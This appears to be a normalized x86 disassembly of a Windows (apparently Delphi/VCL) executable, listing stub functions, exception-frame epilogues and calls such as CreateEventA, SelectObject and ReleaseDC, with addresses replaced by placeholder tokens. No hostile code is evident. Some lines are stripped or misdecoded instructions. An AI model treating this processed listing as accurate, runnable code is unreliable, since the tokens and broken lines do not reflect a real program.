cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_41c254
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_41c3fd
jmp sub_403970
sub_41c45c
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
retn
sub_41c4ec
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_41c53c
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
sub_41c727
jmp sub_403970
sub_41c72e
mov esp ebp
pop ebp
retn
sub_41c7d8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b980
call sub_4039a8
retn
sub_41c860
mov [ eax + 0x18 ] edx
retn
sub_41c9dc
mov ecx edx
mov edx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
xchg edx eax
call sub_416754
retn
sub_41ca63
jmp sub_403970
sub_41ca6a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41cb16
jmp sub_403970
sub_41cb1d
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41ccc1
jmp sub_403970
sub_41cd13
jmp sub_403970
sub_41cd32
jmp sub_403970
sub_41cd39
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cd58
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41cd51
jmp sub_403970
sub_41cd58
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41cdfb
jmp sub_403970
sub_41ce83
jmp sub_403970
sub_41ce90
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b980
call sub_4039a8
pop ebx
retn
sub_41cea8
mov eax [ rw-data ]
call sub_41ce90
retn
sub_41cee0
push ebx
call sub_4165d4
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_41cea8
sub_41d04d
jmp sub_403970
sub_41d054
mov eax [ ebp - 0x4 ]
add eax 0x70
call sub_403f6c
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_41d174
jmp sub_403970
sub_41d17b
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41d272
jmp sub_403970
sub_41d28f
jmp sub_403970
sub_41d296
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d394
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_41bddc
mov edx [ ebx + 0x14 ]
sub edx [ ebx + 0x10 ]
sub eax edx
pop ebx
retn
sub_41d458
push ebx
mov ebx eax
mov eax ebx
call sub_41ee0c
cmp al 0x9
sete al
pop ebx
retn
sub_41d4b7
jmp sub_403970
sub_41d4be
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41d564
jmp sub_403970
sub_41d56b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41d584
jmp [ ebx + ecx * 4 + 0x41 ]
sub_41d7ea
jmp sub_4036bc
sub_41d816
jmp sub_4036bc
sub_41d8b8
jmp sub_4036bc
sub_41d95b
jmp sub_4036bc
sub_41db33
jmp sub_4036bc
sub_41db75
jmp sub_403970
sub_41dba5
jmp sub_403970
sub_41dbac
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41dc1b
jmp sub_403970
sub_41dcf2
jmp sub_403970
sub_41dcf9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41dfcc
mov dl 0x1
call sub_41cf34
retn
sub_41e10d
jmp sub_403970
sub_41e114
pop ebx
mov esp ebp
pop ebp
retn
sub_41e11c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_41ef1c
mov eax [ rw-data ]
call sub_41ce90
pop ebp
retn
j_sub_4037e8#4
jmp sub_4037e8
j_sub_4037e8#5
jmp sub_4037e8
sub_41e308
jmp sub_403970
sub_41e30f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e3ef
jmp sub_403970
sub_41e3f6
mov esp ebp
pop ebp
retn
sub_41e4ae
jmp sub_403970
sub_41e4b5
pop ecx
pop ecx
pop ebp
retn
sub_41e7b7
jmp sub_403970
sub_41e7be
pop ebx
mov esp ebp
pop ebp
retn
sub_41ea63
jmp sub_403970
sub_41ea6a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_40321c
retn
sub_41ea83
jmp sub_403970
sub_41eaa7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_4036bc
sub_41eade
jmp sub_4036bc
sub_41eb1d
jmp sub_403970
sub_41eb24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41eb46
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_403f90
retn
sub_41eb3f
jmp sub_403970
sub_41eb46
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ebcd
jmp sub_4036bc
sub_41ebfa
jmp sub_403970
sub_41ec01
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41ec0c
push ecx
mov edx esp
mov ecx 0x4
call sub_41d3d0
mov eax [ esp ]
cmp eax [ rw-data ]
je r-xdata
pop edx
retn
mov eax [ rw-data ]
call sub_41ce90
sub_41ed19
jmp sub_403970
sub_41ed20
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41edff
jmp sub_403970
sub_41ee06
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ee5c
jmp sub_403970
sub_41ee63
pop ebx
pop ecx
pop ebp
retn
sub_41f0ab
jmp sub_403970
sub_41f0b2
pop ecx
pop ecx
pop ebp
retn
sub_41f0f5
jmp sub_403970
sub_41f0fc
pop ebx
pop ecx
pop ebp
retn
sub_41f198
jmp sub_403970
sub_41f19f
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f24d
jmp sub_403970
sub_41f254
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f260
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_41f4bb
jmp sub_403970
sub_41f4c2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f4e7
mov eax [ ebp - 0x8 ]
call sub_40321c
mov eax [ ebp - 0x4 ]
call sub_40321c
retn
sub_41f4e0
jmp sub_403970
sub_41f4e7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f50c
lea eax [ ebp - 0x1c ]
call sub_40599c
lea eax [ ebp - 0x18 ]
call sub_403f6c
retn
sub_41f505
jmp sub_403970
sub_41f50c
pop ebx
mov esp ebp
pop ebp
retn
sub_41f71e
jmp sub_403970
sub_41f725
pop ebx
mov esp ebp
pop ebp
retn
sub_41f778
push ebx
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_41c040
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
sub_41f790
test dl dl
je r-xdata
mov dl 0x8
call sub_41f914
retn
mov dl 0x9
call sub_41f914
retn
sub_41f818
mov dl 0x1
call sub_41f914
retn
sub_41f820
xor edx edx
call sub_41f914
retn
sub_41f905
jmp sub_403970
sub_41f90c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41f928
push rw-data
call InitializeCriticalSection
push r-xdata
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_40ce50
sub_41f95c
push rw-data
call DeleteCriticalSection
mov eax [ rw-data ]
push eax
call CloseHandle
retn
sub_41f974
mov eax [ rw-data ]
push eax
call ResetEvent
retn
sub_41f980
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call WaitForSingleObject
test eax eax
jne r-xdata
pop ebx
retn
call sub_41f974
sub_41faa6
jmp sub_4036bc
sub_41fad5
jmp sub_403970
sub_41fb0b
jmp sub_403970
sub_41fb12
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fb31
push rw-data
call LeaveCriticalSection
retn
sub_41fb2a
jmp sub_403970
sub_41fb31
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41fc00
test [ eax + 0x1c ] 0x8
jne r-xdata
retn
call sub_41fddc
sub_41fc60
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41df1c
mov [ ebx + 0x18 ] ax
pop esi
pop ebx
retn
sub_41fc74
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41df1c
mov [ ebx + 0x1a ] ax
pop esi
pop ebx
retn
sub_41fc88
movzx eax [ eax + 0x18 ]
xchg edx eax
call sub_41f7a4
retn
sub_41fc94
movzx eax [ eax + 0x1a ]
xchg edx eax
call sub_41f7a4
retn
sub_41ff3c
xor eax eax
retn
sub_41ff40
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_41ff48
xor eax eax
retn
sub_41ff4c
retn
sub_41ff50
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403fc0
pop esi
pop ebx
retn
sub_41ff64
mov eax [ eax + 0x4 ]
retn
sub_41ff68
retn
sub_41ff6c
xor eax eax
retn
sub_41ff70
retn
sub_41ff74
push ebx
mov ebx eax
or [ ebx + 0x1c ] 0x40
pop ebx
retn
sub_41ff80
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xffbf
pop ebx
retn
sub_41ff8c
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xfffe
pop ebx
retn
sub_41ff98
retn
sub_41ff9c
xchg edx eax
call sub_41dbc0
retn
sub_41ffa4
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_42002c
push esi
mov esi eax
mov eax edx
mov edx esi
mov si 0xfff4
call sub_403418
pop esi
retn
sub_420040
retn
sub_420120
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403fc0
pop esi
pop ebx
retn
sub_420160
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_4202ac
push ebx
cmp [ eax + 0x20 ] 0x0
je r-xdata
call sub_403464
pop ebx
retn
mov eax [ eax + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
pop ebx
retn
sub_4202c4
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_42034c
retn
sub_420394
retn
sub_4203cc
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_4203e4
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_420608
mov eax [ ebx + 0x10 ]
mov si 0xffef
call sub_403418
pop esi
pop ebx
retn
sub_42042c
mov al 0x1
retn
sub_420430
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_420438
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_4204e0
xor eax eax
retn
sub_4204e4
retn
sub_420510
retn
sub_4205a8
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_4205bc
mov [ edx + 0x10 ] eax
mov eax [ eax + 0x50 ]
call sub_41a040
retn
sub_420703
jmp sub_4036bc
sub_420708
mov ebx 0x1
call sub_403a24
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_42076b
jmp sub_4036bc
sub_420770
mov ebx 0x80030103
call sub_403a24
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_4207ee
jmp sub_4036bc
sub_4207f3
mov ebx 0x80030009
call sub_403a24
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
sub_420851
jmp sub_4036bc
sub_420856
mov ebx 0x8000ffff
call sub_403a24
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_420a21
jmp sub_403970
sub_420a32
jmp sub_4036bc
sub_420a37
mov [ ebp - 0x4 ] 0x8000ffff
call sub_403a24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420a60
lea eax [ ebp + 0xc ]
call sub_40599c
retn
sub_420a59
jmp sub_403970
sub_420a60
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_420a6c
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_420a78
push ebp
mov ebp esp
mov eax 0x80030102
pop ebp
retn 0x4
sub_420a84
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_420a90
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_420aff
jmp sub_4036bc
sub_420b04
mov esi 0x8000ffff
call sub_403a24
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_420b18
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_420b85
jmp sub_403970
sub_420b8c
mov eax [ rw-data ]
call sub_40321c
pop edi
pop esi
pop ebx
pop ebp
retn
sub_420b9c
call sub_41998c
retn
sub_420c64
test eax eax
je r-xdata
retn
mov edx [ rw-data ]
mov [ eax + 0x5 ] edx
mov [ rw-data ] eax
sub_420e08
jmp sub_403970
sub_420e0f
pop ebp
retn
sub_420e9d
jmp sub_403970
sub_420ea4
pop ebp
retn
sub_42116d
jmp sub_403970
sub_421174
pop ebp
retn
sub_421178
sub [ rw-data ] 0x1
retn
sub_421b5d
add eax 0xffffffd8
jmp sub_425d94
sub_421b65
add [ esp + 0x4 ] 0xffffffd8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xc ]
sub_421c32
cld
[ esi + ebx * 2 ]
sub_422128
test eax eax
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_42219c
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_422210
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_42221c
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_4222fc
jmp sub_403970
sub_422303
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_422393
jmp sub_403970
sub_422425
jmp sub_403970
sub_42242c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_422490
jmp sub_403970
sub_422497
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4224ff
jmp sub_403970
sub_422506
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4225a9
jmp sub_403970
sub_4225b0
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_422a08
push 0x33
mov ecx rw-data
call sub_419c4c
retn
sub_422a18
push 0x33
mov ecx rw-data
call sub_419c0c
retn
sub_422a28
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_422a4c
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push edx
call LeaveCriticalSection
sub_422c20
push 0x11
mov ecx rw-data
call sub_419c0c
retn
sub_422d60
push ebx
mov ebx eax
mov eax ebx
call sub_422a28
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_422e1a
jmp sub_403970
sub_422e21
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_422a4c
retn
sub_422e37
jmp sub_403970
sub_422e50
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0xb
[ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_422ead
jmp sub_403970
sub_422eb4
pop ebx
pop ecx
pop ebp
retn
sub_42302d
jmp sub_403970
sub_423055
jmp sub_403970
sub_42305c
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_4230c8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
add edx 0x1b
call sub_4041d0
pop esi
pop ebx
retn
sub_42313c
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
push eax
push 0x48
mov eax ebx
call sub_423098
push eax
call MulDiv
neg eax
pop ebx
retn
sub_4231b0
mov eax [ eax + 0x10 ]
mov al [ eax + 0x18 ]
retn
sub_4231e0
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1a ]
retn
sub_4232fe
jmp sub_403970
sub_423305
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_422a4c
retn
sub_42331b
jmp sub_403970
sub_423391
jmp sub_403970
sub_423398
pop ebx
pop ecx
pop ebp
retn
sub_42339c
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
retn
sub_423452
jmp sub_403970
sub_423478
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_4234a8
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x18 ]
retn
sub_4235b7
jmp sub_403970
sub_4235be
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_422a4c
retn
sub_4235d4
jmp sub_403970
sub_42364d
jmp sub_403970
sub_423654
pop ebx
pop ecx
pop ebp
retn
sub_423785
jmp sub_403970
sub_423798
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_423ad8
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
inc [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
lea eax [ ebx + 0x38 ]
push eax
call EnterCriticalSection
pop ebx
retn
sub_423cb4
jmp sub_403970
sub_423cbb
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_423cc4
push ebx
mov ebx eax
lea eax [ ebx + 0x38 ]
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
dec [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
pop ebx
retn
sub_423cfc
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_423d08
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_423e48
retn
sub_423f11
add [ eax ] al
add [ ebx + 0x66 ] dl
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_423f28
push ebx
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_424014
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x2
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_424034
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x4
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_424054
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x8
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_424074
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b980
call sub_4039a8
pop ebx
retn
sub_42408c
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b980
call sub_4039a8
pop ebx
retn
sub_4240b0
mov eax [ rw-data ]
call sub_42408c
retn
sub_424112
jmp sub_403970
sub_424119
pop ecx
pop ebp
retn
sub_4241b8
jmp sub_403970
sub_4241bf
pop ebx
mov esp ebp
pop ebp
retn
sub_424291
jmp sub_403970
sub_424322
jmp sub_403970
sub_424329
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_424354
dec ecx
imul edx
add eax ecx
not ecx
and eax ecx
test eax eax
jns r-xdata
sar eax 0x3
retn
add eax 0x7
sub_42443b
jmp sub_403970
sub_4245e8
jmp sub_403970
sub_4245ef
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
sub_424801
jmp sub_403970
sub_424808
lea eax [ ebp - 0x408 ]
push eax
call CreatePalette
pop ebx
mov esp ebp
pop ebp
retn
sub_4248a2
jmp sub_403970
sub_424a7e
jmp sub_403970
sub_424b38
jmp sub_403970
sub_424b3f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424b5f
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_424b58
jmp sub_403970
sub_424b5f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_424ced
jmp sub_403970
sub_424eb8
jmp sub_403970
sub_424ebf
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424ee2
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
call sub_4027ac
retn
sub_424edb
jmp sub_403970
sub_424ee2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424f02
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_4027ac
retn
sub_424efb
jmp sub_403970
sub_424f02
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_424f0c
xor ecx ecx
mov edx eax
add eax 0x14
jmp r-xdata
cmp edx eax
jl r-xdata
xor cx [ edx ]
add edx 0x2
mov eax ecx
retn
sub_42506c
push 0x0
call sub_425008
retn
sub_425111
jmp sub_403970
sub_425118
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_425124
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
call sub_425074
pop ebx
pop ebp
retn 0x4
sub_425138
retn
sub_42513c
test eax eax
jne r-xdata
retn
call sub_425138
sub_42530f
jmp sub_403970
sub_425336
jmp sub_403970
sub_42533d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42537c
push ebx
mov [ eax + 0x20 ] 0x1
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_425549
mov eax [ ebp - 0xc ]
call sub_40321c
retn
sub_425552
jmp sub_403970
j_sub_425549
jmp sub_425549
sub_425559
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_40321c
retn
sub_42556f
jmp sub_403970
sub_425580
xor eax eax
retn
sub_425584
mov al [ eax + 0x21 ]
retn
sub_4255d0
jmp sub_403970
sub_4255d7
pop esi
pop ecx
pop ebp
retn
sub_425604
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
retn
sub_42565b
jmp sub_403970
sub_425662
pop esi
pop ecx
pop ebp
retn
sub_425668
retn
sub_42566c
cmp dl [ eax + 0x21 ]
je r-xdata
retn
mov [ eax + 0x21 ] dl
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42567c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop esi
retn
sub_425801
jmp sub_403970
sub_425808
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_425927
jmp sub_403970
sub_42592e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4259b6
jmp sub_403970
sub_4259bd
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425b18
jmp sub_4036bc
sub_425b3c
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_425724
mov [ rw-data ] eax
sub_425b5c
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_425a28
mov [ rw-data ] eax
sub_425c84
push ebx
mov ebx eax
mov edx [ r-xdata ]
mov eax ebx
call sub_425c20
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_425c9c
push ebx
mov ebx eax
mov edx [ r-xdata ]
mov eax ebx
call sub_425c20
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_425cb4
push ebx
mov ebx eax
mov edx [ r-xdata ]
mov eax ebx
call sub_425c20
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_425d5c
jmp sub_4036bc
sub_425d7c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_425c84
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
pop ebx
retn
sub_425d94
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_425c84
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop edi
pop esi
retn
sub_425f01
jmp sub_4036bc
sub_425f7f
jmp sub_403970
sub_425f86
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4260b4
xor edx edx
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov eax ecx
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx eax
sub_4260cc
xor edx edx
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov eax ecx
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx eax
sub_426120
retn
sub_426194
jmp sub_403970
sub_4263ab
jmp sub_403970
sub_4263b2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4263cf
lea eax [ ebp - 0x20 ]
call sub_403f6c
retn
sub_4263c8
jmp sub_403970
sub_4266dc
cmp [ eax + 0x28 ] 0x0
sete al
retn
sub_4266e4
mov edx [ eax + 0x28 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_426758
push ebx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
mov eax ebx
call sub_4268cc
sub_426770
push ebx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
mov eax ebx
call sub_4268cc
sub_426a20
jmp sub_403970
sub_426a27
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_426b9f
jmp sub_403970
sub_426ba6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_426c35
jmp sub_403970
sub_426c3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426c5e
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f90
retn
sub_426c57
jmp sub_403970
sub_426c5e
pop ebx
mov esp ebp
pop ebp
retn
sub_426c71
add [ eax ] al
add [ ebx + 0x74002878 ] al
adc al [ eax + 0x74002c78 ]
pop es
call sub_426fe8
jmp r-xdata
retn
sub_426c87
call sub_427074
retn
sub_426e0c
retn
sub_427064
jmp sub_403970
sub_42718f
jmp sub_403970
sub_427196
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
sub_4271af
jmp sub_403970
sub_427274
push ebx
mov ebx eax
mov eax ebx
call sub_426ee4
mov eax [ ebx + 0x28 ]
mov edx [ eax + 0x8 ]
xor ecx ecx
mov [ eax + 0x8 ] ecx
mov eax edx
pop ebx
retn
sub_4273a2
jmp sub_403970
sub_4273ca
jmp sub_403970
sub_4273d1
mov esp ebp
pop ebp
retn
sub_427448
jmp sub_403970
sub_427550
jmp sub_403970
sub_42763b
jmp sub_403970
sub_427648
inc [ eax + 0x4 ]
retn
sub_4277c3
jmp sub_403970
sub_427b74
jmp sub_403970
sub_427dbe
jmp sub_403970
sub_427de8
jmp sub_403970
sub_427def
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427e11
mov eax [ ebp - 0x14 ]
push eax
